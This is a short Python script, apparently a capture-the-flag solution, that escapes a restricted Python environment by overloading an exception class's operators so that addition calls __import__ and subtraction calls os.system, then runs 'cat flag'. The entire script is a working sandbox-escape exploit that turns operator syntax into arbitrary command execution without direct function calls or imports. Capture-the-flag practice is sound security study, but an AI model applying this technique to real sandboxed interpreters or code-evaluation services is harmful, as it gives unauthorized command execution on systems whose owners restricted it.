#!/usr/bin/env python3

# Declare arbitrary exception class
class Klecko(Exception):
    def __add__(self, algo):
        return 0
    def __sub__(self, algo):
        return 1

# Change add function
Klecko.__add__ = __import__

try:
    raise Klecko
except Klecko as k:
    # Change sub function
    Klecko.__sub__ = (k + 'os').system
    # RCE abusing __sub__
    k - 'cat flag'